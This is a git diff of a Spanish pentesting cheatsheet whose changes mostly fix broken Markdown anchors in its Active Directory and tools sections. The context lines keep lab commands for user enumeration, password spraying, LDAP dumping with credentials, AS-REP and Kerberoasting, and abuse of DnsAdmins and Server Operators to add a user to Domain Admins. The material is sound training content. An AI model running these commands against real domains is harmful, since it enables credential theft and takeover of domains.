 Move-ADObject -Identity "CN=NombreEquipo,OU=Origen,DC=dominio,DC=com" -TargetPath "OU=Destino,DC=dominio,DC=com"
 ```
 
-####  11.1.8. <a name='gpo-(group-po
-<a id="markdown-%3Ca-name%3D'gpo-group-pol" name="%3Ca-name%3D'gpo-group-pol"></a>l
+####  11.1.8. <a name='gpo-(group-policy-object)'></a>GPO (Group Policy Object)
 
 ##### Obtener una lista de todas las GPO
 
@@ -5439,8 +5272,7 @@ Para restaurar desde una copia de seguridad:
 Restore-GPO -Name "NombreGPO" -Path "C:\Ruta\Backup"
 ```
 
-###  11.2. <a name='habilitar-dont-
-<a id="markdown-%3Ca-name%3D'habilitar-dont-r" name="%3Ca-name%3D'habilitar-dont-r"></a>r
+###  11.2. <a name='habilitar-dont-req-pre-auth'></a>Habilitar DONT-REQ-PRE-AUTH
 
 ```powershell
 # Nombre del usuario a modificar
@@ -5462,21 +5294,18 @@ Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}
 (Get-ADUser -Identity $user -Properties userAccountControl).userAccountControl
 ```
 
-###  11.3. <a name='deshabilitar-dont-
-<a id="markdown-%3Ca-name%3D'deshabilitar-dont-r" name="%3Ca-name%3D'deshabilitar-dont-r"></a>r
+###  11.3. <a name='deshabilitar-dont-req-pre-auth'></a>Deshabilitar DONT-REQ-PRE-AUTH
 
 ```powershell
 $newUAC = $u.userAccountControl -band -bnot 0x400000
 Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}
 ```
 
-###  11.4. <a name=
-<a id="markdown-%3Ca-name%3D'" name="%3Ca-name%3D'"></a>'
+###  11.4. <a name='enumeración-3'></a>Enumeración
 
 Si no tenemos un usuario con el que empezar las pruebas (que suele ser el caso), tendremos que encontrar una manera de establecer un punto de apoyo en el dominio, ya sea obteniendo credenciales en texto claro o un hash de contraseña NTLM para un usuario, un shell SYSTEM en un host unido al dominio, o un shell en el contexto de una cuenta de usuario de dominio. Obtener un usuario válido con credenciales es crítico en las primeras etapas de una prueba de penetración interna. Este acceso (incluso al nivel más bajo) abre muchas oportunidades para realizar enumeraciones e incluso ataques.
 
-####  11.4.1. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+####  11.4.1. <a name='kerbrute'></a>Kerbrute
 
 [Kerbrute](https://github.com/ropnop/kerbrute) puede ser una opción más sigilosa para la enumeración de cuentas de dominio. Se aprovecha del hecho de que los fallos de pre-autenticación Kerberos a menudo no activan registros o alertas. Utilizaremos Kerbrute junto con las listas de usuarios como pueden ser **jsmith.txt** o **jsmith2.txt** de [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). Este repositorio contiene muchas listas de usuarios diferentes que pueden ser extremadamente útiles cuando se intenta enumerar usuarios cuando se comienza desde una perspectiva no autenticada. Podemos apuntar Kerbrute al DC y alimentarlo con una lista de palabras. La herramienta es rápida, y se nos proporcionarán resultados que nos permitirán saber si las cuentas encontradas son válidas o no, lo cual es un gran punto de partida para lanzar ataques como el de Password Spraying.
 
@@ -5495,8 +5324,7 @@ kerbrute bruteuser --d HACKLAB.LOCAL -dc 192.168.56.10 jsmith.txt thomas.brown
 Otras herramientas a tener en cuenta son [RPCClient](#426-rpcclient) y [Enum4Linux](#424-enum4linux).
 
 
-####  11.4.2. <a name='passw
-<a id="markdown-%3Ca-name%3D'passwo" name="%3Ca-name%3D'passwo"></a>o
+####  11.4.2. <a name='password-spraying'></a>Password Spraying
 
 Otro aspecto destacable es el ataque conocido como Password Spraying. Para contextualizar, imaginemos que disponemos de unas credenciales como `thomas.brown:MySup3erPass123!`. Una táctica común en este escenario es conectarse al Protocolo de Llamada a Procedimientos Remotos (RPC) - para extraer una lista de todos los usuarios del dominio. Esta lista se guarda en un archivo, por ejemplo users.txt, y luego se proporciona como entrada a herramientas como el propio netexec, junto con la contraseña antes mencionada. Este proceso permite intentar el acceso a múltiples cuentas del dominio, aprovechando la débil seguridad de la contraseña utilizada.
 
@@ -5512,8 +5340,7 @@ nxc smb 192.168.56.10 -u users.txt -p passwords.txt --continue-on-success --no-b
 
 El argumento `--no-bruteforce` se emplea para evitar la prueba de todas las contraseñas disponibles para cada usuario, en su lugar, se prueba el usuario de la línea 1 con la contraseña de la línea 1, el usuario de la línea 2 con la contraseña de la línea 2, y así sucesivamente.
 
-####  11.4.3. <a name
-<a id="markdown-%3Ca-name%3D" name="%3Ca-name%3D"></a>=
+####  11.4.3. <a name='bloodhound'></a>BloodHound
 
 ##### Opción 1
 
@@ -5556,8 +5383,7 @@ Otra alternativa es utilizar [SharpHound.exe](https://github.com/SpecterOps/Bloo
 
 Por ultimo, descargamos el archivo `zip` nuevamente y los subimos en `BloodHound`.
 
-####  11.4.4. <a name
-<a id="markdown-%3Ca-name%3D" name="%3Ca-name%3D"></a>=
+####  11.4.4. <a name='ldapsearch'></a>ldapsearch
 Para enumerar a través del protoclo LDAP, podemos usar la herramienta `ldapsearch`:
 
 ```bash
@@ -5579,8 +5405,7 @@ ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erP
 ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -s base -b "DC=HACKLAB,DC=LOCAL" "(objectClass=*)" "*" +
 ```
 
-####  11.4.5. <a name='ld
-<a id="markdown-%3Ca-name%3D'lda" name="%3Ca-name%3D'lda"></a>a
+####  11.4.5. <a name='ldapdomaindump'></a>ldapdomaindump
 
 En caso de tener credenciales válidas podemos hacer uso de `ldapdomaindump`:
 
@@ -5590,8 +5415,7 @@ ldapdomaindump -u 'HACKLAB.local\thomas.brown' -p 'Password123' 192.168.56.10
 
 Esto generará unos archivos `json`, `grep`, `html` que con un servidor web podemos ver en el navegador.
 
-####  11.4.6. <a name='ne
-<a id="markdown-%3Ca-name%3D'net" name="%3Ca-name%3D'net"></a>t
+####  11.4.6. <a name='netexec---ldap'></a>NetExec - LDAP
 
 ```bash
 netexec ldap <RHOST> -u '' -p '' -M -user-desc
@@ -5616,11 +5440,9 @@ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c
 netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
 ```
 
-###  11.5. <a name='grupos-p
-<a id="markdown-%3Ca-name%3D'grupos-pr" name="%3Ca-name%3D'grupos-pr"></a>r
+###  11.5. <a name='grupos-privilegiados'></a>Grupos Privilegiados
 
-####  11.5.1. <a name='accou
-<a id="markdown-%3Ca-name%3D'accoun" name="%3Ca-name%3D'accoun"></a>n
+####  11.5.1. <a name='account-operators'></a>Account Operators
 
 Es un grupo incorporado de Active Directory pensado para delegar la gestión de cuentas de usuarios y grupos estándar, sin dar acceso completo de administración del dominio.
 
@@ -5708,8 +5530,7 @@ Import-module .\PowerView.ps1
 Set-DomainObject -Identity tyrell.wellick -SET @{serviceprincipalname='nonexistent/FAKE'}
 ```
 
-####  11.5.2. <a name='serv
-<a id="markdown-%3Ca-name%3D'serve" name="%3Ca-name%3D'serve"></a>e
+####  11.5.2. <a name='server-operators'></a>Server Operators
 
 Es un grupo buit-in en los controladores de dominio (DC) que tiene privilegios para administrar servidores, pero no es un grupo administrativo a nivel dominio como Domain Admins.
 
@@ -5748,8 +5569,7 @@ net localgroup administrators hacker /add
 
 Podemos escribir en `C:\Windows\Tasks`, lo que se puede usar para ejecución diferida o persistencia.
 
-####  11.5.3. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+####  11.5.3. <a name='dnsadmins'></a>DnsAdmins
 
 Los usuarios que son miembros del grupo **DnsAdmins** tienen la capacidad de abusar de una característica del protocolo de gestión DNS de Microsoft para hacer que el servidor DNS cargue cualquier DLL especificada. El servicio que a su vez, ejecuta la DLL se realiza en el contexto de SYSTEM y podría utilizarse en un controlador de dominio (desde donde se ejecuta DNS normalmente) para obtener privilegios de administrador de dominio.
 
@@ -5833,18 +5653,15 @@ Bloodhound
     net user hacker Password123! /add && net group "Domain Admins" /add hacker
     ```
 
-####  11.5.4. <a name='back
-<a id="markdown-%3Ca-name%3D'backu" name="%3Ca-name%3D'backu"></a>u
+####  11.5.4. <a name='backup-operators'></a>Backup Operators
 
 Ver [BackupOperators - SeBackupPrivilege y SeRestorePrivilege](#backupoperators---sebackupprivilege-y-serestoreprivilege).
 
-###  11.6. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+###  11.6. <a name='kerberos'></a>Kerberos
 
 ![Kerberos](./img/kerberos.webp)
 
-####  11.6.1. <a name='¿qué-
-<a id="markdown-%3Ca-name%3D'%C2%BFqu%C3%A9-e" name="%3Ca-name%3D'%C2%BFqu%C3%A9-e"></a>e
+####  11.6.1. <a name='¿qué-es-kerberos?'></a>¿Qué es Kerberos?
 
 Kerberos es un protocolo de **autenticación**, pero no de autorización. Esto significa que su función es verificar la identidad de un usuario mediante una contraseña conocida solo por él, sin definir a qué recursos o servicios puede acceder.  
 
@@ -5912,8 +5729,7 @@ A continuación se muestra un resumen de los mensajes siguiendo la secuencia de 
 
 ![Kerberos Flow](./img/kerberos_flow.png)
 
-####  11.6.2. <a name='as
-<a id="markdown-%3Ca-name%3D'as-" name="%3Ca-name%3D'as-"></a>-
+####  11.6.2. <a name='as-reproasting'></a>AS-REPRoasting
 
 **AS-REPRoasting** es uno de los ataques más básicos contra Kerberos y tiene como objetivo cuentas sin **preautenticación habilitada**. Aunque es poco común en entornos bien configurados, es uno de los pocos ataques de Kerberos que **no requiere autenticación previa**.  
 
@@ -5968,8 +5784,7 @@ john --wordlist=rockyou.txt hashes.asreproast
 
 - Revisión de políticas de seguridad.
 
-####  11.6.3. <a name='k
-<a id="markdown-%3Ca-name%3D'ke" name="%3Ca-name%3D'ke"></a>e
+####  11.6.3. <a name='kerberoasting'></a>Kerberoasting  
 
 > Un **Service Principal Name (SPN)** es un identificador único de una instancia de servicio. Los SPN son utilizados por la autenticación Kerberos para asociar una instancia de servicio con una cuenta de inicio de sesión de servicio.  
 > — [MSDN](https://docs.microsoft.com/windows/desktop/AD/service-principal-names)  
@@ -6042,17 +5857,13 @@ Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHB
 
 - No ejecutar las cuentas de Servicio como Administrador del Dominio.
 
-###  11.7. <a name='movimi
-<a id="markdown-%3Ca-name%3D'movimie" name="%3Ca-name%3D'movimie"></a>e
+###  11.7. <a name='movimiento-lateral-1'></a>Movimiento Lateral
 
-###  11.8. <a name='post
-<a id="markdown-%3Ca-name%3D'post-" name="%3Ca-name%3D'post-"></a>-
+###  11.8. <a name='post-explotación'></a>Post Explotación
 
-##  12. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+##  12. <a name='apéndice'></a>Apéndice
 
-###  12.1. <a name='🛡️-permisos-delegables-en-acti
-<a id="markdown-%3Ca-name%3D'%F0%9F%9B%A1%EF%B8%8F-permisos-delegables-en-activ" name="%3Ca-name%3D'%F0%9F%9B%A1%EF%B8%8F-permisos-delegables-en-activ"></a>v
+###  12.1. <a name='🛡️-permisos-delegables-en-active-directory'></a>🛡️ Permisos delegables en Active Directory
 
 | Permiso               | Descripción                                                                    |
 | --------------------- | ------------------------------------------------------------------------------ |
@@ -6064,8 +5875,7 @@ Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHB
 | `ForceChangePassword` | Puede cambiar la contraseña del objeto sin conocer la actual.                  |
 | `Self`                | Puede agregarse a sí mismo en ciertos atributos, como por ejemplo, a un grupo. |
 
-###  12.2. <a name='🎯-flags-de-useraccount
-<a id="markdown-%3Ca-name%3D'%F0%9F%8E%AF-flags-de-useraccountc" name="%3Ca-name%3D'%F0%9F%8E%AF-flags-de-useraccountc"></a>c
+###  12.2. <a name='🎯-flags-de-useraccountcontrol-(ad)'></a>🎯 Flags de userAccountControl (AD)
 
 | Flag Name                        | Valor (Decimal) | Valor (Hexadecimal) | Descripción                                                                  |
 |----------------------------------|------------------|----------------------|----------------------------------------------------------------------------|
@@ -6095,26 +5905,23 @@ Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHB
 > 💡 Podemos combinar múltiples flags con OR binario (`-bor`) y removerlas con AND + NOT (`-band -bnot`).
 
 
-##  13. <a name='herramienta
-<a id="markdown-%3Ca-name%3D'herramientas" name="%3Ca-name%3D'herramientas"></a>s
+##  13. <a name='herramientas-y-recursos'></a>Herramientas y Recursos
 
 Enlaces a las distintas herramientas y recursos.
-###  13.1. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+###  13.1. <a name='pivoting-1'></a>Pivoting
 
 | Nombre    | URL                                                                      |
 | --------- | ------------------------------------------------------------------------ |
 | Chisel    | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
 | Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
                             
-###  13.2. <a name='informati
-<a id="markdown-%3Ca-name%3D'informatio" name="%3Ca-name%3D'informatio"></a>o
+###  13.2. <a name='information-gathering-1'></a>Information Gathering
 
 | Nombre | URL                          |
 | ------ | ---------------------------- |
 | Nmap   | https://github.com/nmap/nmap |
 
-###  13.3. <
+###  13.3. <a name='web-1'></a>Web
 
 | Nombre                     | URL                                                                          |
 | -------------------------- | ---------------------------------------------------------------------------- |
@@ -6132,15 +5939,13 @@ Enlaces a las distintas herramientas y recursos.
 | Git-Dumper                 | https://github.com/arthaud/git-dumper                                        |
 | Extractor                  | https://github.com/internetwache/GitTools/blob/master/Extractor/extractor.sh |
 
-###  13.4. <a name='ba
-<a id="markdown-%3Ca-name%3D'bas" name="%3Ca-name%3D'bas"></a>s
+###  13.4. <a name='bases-de-datos'></a>Bases de datos
 
 | Nombre                   | URL                            |
 | ------------------------ | ------------------------------ |
 | SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |
 
-###  13.5. <a name='passw
-<a id="markdown-%3Ca-name%3D'passwo" name="%3Ca-name%3D'passwo"></a>o
+###  13.5. <a name='passwords-attacks-1'></a>Passwords Attacks
 
 | Nombre                          | URL                                                                                                        |
 | ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
@@ -6158,8 +5963,7 @@ Enlaces a las distintas herramientas y recursos.
 | ntlm.pw                         | [https://ntlm.pw](https://ntlm.pw)                                                                         |
 | pypykatz                        | [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)                                 |
 
-###  13.6. <a nam
-<a id="markdown-%3Ca-name" name="%3Ca-name"></a>e
+###  13.6. <a name='wordlists'></a>Wordlists
 
 | Nombre                        | URL                                                                                                                |
 | ----------------------------- | ------------------------------------------------------------------------------------------------------------------ |
@@ -6172,15 +5976,13 @@ Enlaces a las distintas herramientas y recursos.
 | CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
 | API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |
 
-###  13.7. <a name='acti
-<a id="markdown-%3Ca-name%3D'activ" name="%3Ca-name%3D'activ"></a>v
+###  13.7. <a name='active-directory-1'></a>Active Directory
 
 | Nombre   | URL                                                      |
 | -------- | -------------------------------------------------------- |
 | Powermad | https://github.com/Kevin-Robertson/Powermad              |
 
-###  13.8. <a name='escalación-de
-<a id="markdown-%3Ca-name%3D'escalaci%C3%B3n-de-" name="%3Ca-name%3D'escalaci%C3%B3n-de-"></a>-
+###  13.8. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
 
 | Nombre   | URL                                                      |
 | -------- | -------------------------------------------------------- |
@@ -6189,8 +5991,7 @@ Enlaces a las distintas herramientas y recursos.
 | Linpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
 | SigmaPotato | https://github.com/tylerdotrar/SigmaPotato |
 
-###  13.9. <a name='recu
-<a id="markdown-%3Ca-name%3D'recur" name="%3Ca-name%3D'recur"></a>r
+###  13.9. <a name='recursos-y-blogs'></a>Recursos y Blogs
 
 | Nombre                                                  | URL                                                                                                                                                                          |
 | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
